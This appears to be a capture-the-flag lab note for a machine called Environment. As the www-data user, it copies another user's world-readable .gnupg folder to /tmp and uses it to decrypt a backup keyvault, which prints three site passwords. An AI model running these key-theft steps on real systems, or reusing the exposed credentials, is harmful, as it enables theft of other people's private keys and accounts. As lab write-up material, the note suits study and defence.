[[Environment]]

==a free and open-source software application that implements the OpenPGP standard==. It's primarily used for encryption and digital signatures, ensuring the confidentiality and authenticity of data and communications. GPG allows users to <mark style="background: #FFF3A3A6;">encrypt files</mark>, email messages, and other data, as well as to digitally sign them to verify their origin and integrity.

If you have read access to `.gnupg` which presents in home directory for every user. Then you can extract the keys and use them to decrypte any information that is encrypted using `.gnupg`

```
www-data@environment:/home/hish$ ls -al
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12 11:51 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6 21:28 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12 14:42 .bashrc
drwxr-xr-x 4 hish hish 4096 May  7 21:48 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6 21:43 .local
-rw-r--r-- 1 hish hish  807 Jan  6 21:28 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 backup
-rw-r--r-- 1 root hish   33 May  7 21:46 user.txt
```

the file `/home/hish/backup/keyvault.gpg` is encrypted using the `.gnupg` folder in the home directory.

```sh
www-data@environment:/home/hish/backup$ ls -al
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 May  7 21:48 keyvault.gpg
```

```sh
#1. move the folder to place you have write access
cp -r /home/hish/.gnupg /tmp/mygnupg

# 2. change perm
chmod -R 700 /tmp/mygnupg

# 3. extract secret keys
gpg --homedir /tmp/mygnupg --list-secret-keys

# 4. decrypt keyvault.gpg
gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
```

Now you can read `message.txt` which contain the encrypted data inside `keyvault.gpg`.
```sh
www-data@environment:/tmp$ cat message.txt 
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```
